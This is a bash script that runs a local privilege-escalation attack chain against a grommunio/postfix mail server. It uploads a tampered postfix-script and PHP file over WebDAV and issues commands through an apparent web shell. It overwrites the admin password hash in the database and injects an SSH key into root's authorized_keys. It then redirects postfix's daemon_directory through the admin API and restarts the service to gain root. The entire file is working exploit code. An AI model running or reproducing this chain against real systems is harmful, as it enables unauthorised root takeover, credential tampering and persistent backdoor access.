#!/bin/bash
# LPE: postfix-script in WEBDIR + Admin API dbconf daemon_directory + postfix.service
set -euo pipefail
. "$(dirname "$0")/00-env.sh"
[[ -n "$PUBKEY" ]] || echo "[!] no ${SSH_KEY}.pub — root SSH key skip"

TMPSCR=$(mktemp)
sed "s|PUBKEY_PLACEHOLDER|echo '$PUBKEY' >> /root/.ssh/authorized_keys|" \
  "$SCRIPTS/lib/postfix-script" > "$TMPSCR"

TMPAPI=$(mktemp)
# keep & and $ out of sed issues — python rewrite
python3 - "$SCRIPTS/lib/api.php" "$TMPAPI" "$ADMIN_PASS" << 'PY'
import sys
src, dst, pw = sys.argv[1], sys.argv[2], sys.argv[3]
open(dst, "w").write(open(src).read().replace("ADMIN_PASS_PLACEHOLDER", pw))
PY

echo "[*] PUT postfix-script + api.php"
curl -sk -X PUT "$DAV/postfix-script" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' --data-binary @"$TMPSCR"
curl -sk -X PUT "$DAV/api.php" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' --data-binary @"$TMPAPI"
rm -f "$TMPSCR" "$TMPAPI"

echo "[*] chmod + symlink postfix bins"
curl -skG --data-urlencode "c=chmod 755 $WEBDIR/postfix-script $WEBDIR/api.php; for f in /usr/lib/postfix/bin/*; do b=\$(basename \"\$f\"); [ \"\$b\" = postfix-script ] && continue; ln -sf \"\$f\" $WEBDIR/\$b; done; ls -l $WEBDIR/postfix-script $WEBDIR/master" "$WS"
echo

echo "[*] set grommunio admin hash"
curl -sk -X PUT "$DAV/setadmin.py" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' --data-binary @- << PY
import subprocess
h = subprocess.check_output(["openssl","passwd","-6","$ADMIN_PASS"]).decode().strip()
subprocess.check_call(["mysql","-u$MYSQL_USER","-p$MYSQL_PASS","grommunio","-e",
    "UPDATE users SET password='%s' WHERE username='admin' OR id=0;" % h])
print("admin hash set", h[:20])
PY
curl -skG --data-urlencode "c=python3 $WEBDIR/setadmin.py" "$WS"
echo

echo "[*] dbconf commit_file=#POSTCONF + daemon_directory=WEBDIR"
curl -skG "$API_PHP" --data-urlencode 'ep=/system/dbconf/grommunio-dbconf/postfix/' \
  --data-urlencode 'm=PUT' --data-urlencode 'body={"data":{"commit_file":"#POSTCONF"}}'
echo
BODY=$(python3 -c 'import json,sys; print(json.dumps({"data":{"daemon_directory":sys.argv[1]}}))' "$WEBDIR")
curl -skG "$API_PHP" --data-urlencode 'ep=/system/dbconf/postfix/main.cf/' \
  --data-urlencode 'm=PUT' --data-urlencode "body=$BODY"
echo
echo "[*] postfix.service reload+restart (unit name MUST be postfix.service)"
curl -skG "$API_PHP" --data-urlencode 'ep=/system/dashboard/services/postfix.service/reload' \
  --data-urlencode 'm=POST' --data-urlencode 'body='
echo
curl -skG "$API_PHP" --data-urlencode 'ep=/system/dashboard/services/postfix.service/restart' \
  --data-urlencode 'm=POST' --data-urlencode 'body='
echo

echo "[*] check root"
curl -skG --data-urlencode 'c=ls -l /usr/bin/bash; sudo -n id' "$WS"
echo
echo "[+] sudo -n id → uid=0 means Linux is rooted"
